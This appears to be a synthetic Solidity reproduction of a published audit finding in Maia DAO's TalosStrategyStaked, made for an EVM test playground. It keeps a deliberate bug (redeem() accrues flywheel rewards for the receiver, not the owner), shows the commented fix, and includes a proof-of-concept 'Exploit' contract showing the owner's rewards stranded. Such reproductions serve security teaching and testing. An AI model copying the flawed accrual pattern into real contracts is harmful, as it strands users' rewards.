// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Maia DAO — redeem() in beforeRedeem uses the wrong owner parameter
    (Code4rena 2023-05, [H-07], #26041)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.

    Root cause: TalosStrategyStaked.redeem() calls
        beforeRedeem(_tokenId, receiver);
    but burns shares from `_owner`. beforeRedeem accrues flywheel rewards for
    the address it is given — so the receiver is accrued, the owner is burned
    without accrue, and the owner's rewards are permanently lost (stranded).
//////////////////////////////////////////////////////////////////////////*/

contract RewardToken {
    string public constant name = "Flywheel Reward";
    string public constant symbol = "RWD";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract Flywheel {
    RewardToken public immutable reward;
    mapping(address => uint256) public shares;
    mapping(address => uint256) public userIndex;
    mapping(address => uint256) public accrued;
    uint256 public globalIndex;
    uint256 public totalShares;
    uint256 public constant SCALE = 1e18;

    constructor(RewardToken _reward) {
        reward = _reward;
        globalIndex = SCALE;
    }

    function setShares(address user, uint256 s) external {
        shares[user] = s;
    }

    function setTotalShares(uint256 t) external {
        totalShares = t;
    }

    function notifyRewards(uint256 amount) external {
        require(totalShares > 0, "no shares");
        reward.mint(address(this), amount);
        globalIndex += (amount * SCALE) / totalShares;
    }

    function accrue(address user) public {
        uint256 s = shares[user];
        uint256 idx = userIndex[user];
        if (idx == 0) idx = SCALE;
        if (s > 0 && globalIndex > idx) {
            accrued[user] += (s * (globalIndex - idx)) / SCALE;
        }
        userIndex[user] = globalIndex;
    }

    function claim(address user) external returns (uint256 amt) {
        accrue(user);
        amt = accrued[user];
        accrued[user] = 0;
        if (amt > 0) reward.transfer(user, amt);
    }
}

/// @notice Reduced TalosStrategyStaked with the wrong-owner beforeRedeem bug.
contract TalosStrategyStaked {
    Flywheel public immutable flywheel;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;
    uint256 public tokenId = 1;
    uint256 public liquidity = type(uint256).max / 2;
    RewardToken public immutable underlying;

    constructor(Flywheel _fw, RewardToken _underlying) {
        flywheel = _fw;
        underlying = _underlying;
    }

    function mintShares(address to, uint256 sharesAmt) external {
        balanceOf[to] += sharesAmt;
        totalSupply += sharesAmt;
        flywheel.setShares(to, balanceOf[to]);
        flywheel.setTotalShares(totalSupply);
        flywheel.accrue(to);
    }

    function beforeRedeem(uint256 /*_tokenId*/, address _owner) internal {
        flywheel.accrue(_owner);
    }

    /// @notice VERBATIM bug shape from the finding.
    function redeem(uint256 sharesAmt, uint256 /*amount0Min*/, uint256 /*amount1Min*/, address receiver, address _owner)
        public
        returns (uint256 amount0, uint256 amount1)
    {
        if (msg.sender != _owner) {
            uint256 allowed = allowance[_owner][msg.sender];
            if (allowed != type(uint256).max) allowance[_owner][msg.sender] = allowed - sharesAmt;
        }

        if (sharesAmt == 0) revert("RedeemingZeroShares");
        if (receiver == address(0)) revert("ReceiverIsZeroAddress");

        uint256 _tokenId = tokenId;
        beforeRedeem(_tokenId, receiver); // @> VULN: accrues receiver, not _owner whose shares are burned
        // FIX: beforeRedeem(_tokenId, _owner);

        amount0 = sharesAmt;
        amount1 = 0;
        _burn(_owner, sharesAmt);
        liquidity -= sharesAmt;
        underlying.mint(receiver, amount0);
    }

    /// @notice Correct path for the control test.
    function redeemFixed(uint256 sharesAmt, address receiver, address _owner) external returns (uint256 amount0) {
        uint256 _tokenId = tokenId;
        beforeRedeem(_tokenId, _owner); // correct: accrue owner
        amount0 = sharesAmt;
        _burn(_owner, sharesAmt);
        liquidity -= sharesAmt;
        underlying.mint(receiver, amount0);
    }

    function _burn(address from, uint256 sharesAmt) internal {
        balanceOf[from] -= sharesAmt;
        totalSupply -= sharesAmt;
        flywheel.setShares(from, balanceOf[from]);
        flywheel.setTotalShares(totalSupply);
    }
}

/// @notice Exploit is the share owner. Redeems to a different receiver → accrue
///         hits the wrong address → owner loses 100 RWD of flywheel rewards.
contract Exploit {
    uint256 public constant SHARES = 100 ether;
    uint256 public constant YIELD = 100 ether;

    RewardToken public rwd;
    RewardToken public underlying;
    Flywheel public flywheel;
    TalosStrategyStaked public strategy;

    

    address public receiverAddr;
    uint256 public ownerClaimed;
    uint256 public strandedInFlywheel;
    uint256 public ownerSharesAfter;

    constructor() {
        receiverAddr = address(0xBEEF); // redeem receiver != owner

        rwd = new RewardToken(); // CREATE 1
        underlying = new RewardToken(); // CREATE 2
        flywheel = new Flywheel(rwd); // CREATE 3
        strategy = new TalosStrategyStaked(flywheel, underlying); // CREATE 4 — vulnerable

        // Exploit = share owner (victim of reward loss)
        strategy.mintShares(address(this), SHARES);
        flywheel.notifyRewards(YIELD);
    }

    function run() external {
        // Buggy redeem: beforeRedeem(receiver) accrues BEEF (0 shares), burns this's shares
        strategy.redeem(SHARES, 0, 0, receiverAddr, address(this));

        ownerSharesAfter = strategy.balanceOf(address(this));
        // Too late: shares already 0, accrue yields nothing
        ownerClaimed = flywheel.claim(address(this));
        strandedInFlywheel = rwd.balanceOf(address(flywheel));

        // HARM: owner got 0 rewards; 100 RWD yield stranded (nobody can claim)
        require(ownerSharesAfter == 0, "shares burned");
        require(ownerClaimed == 0, "owner lost rewards - never accrued before burn");
        require(strandedInFlywheel == YIELD, "yield stranded in flywheel");
    }
}
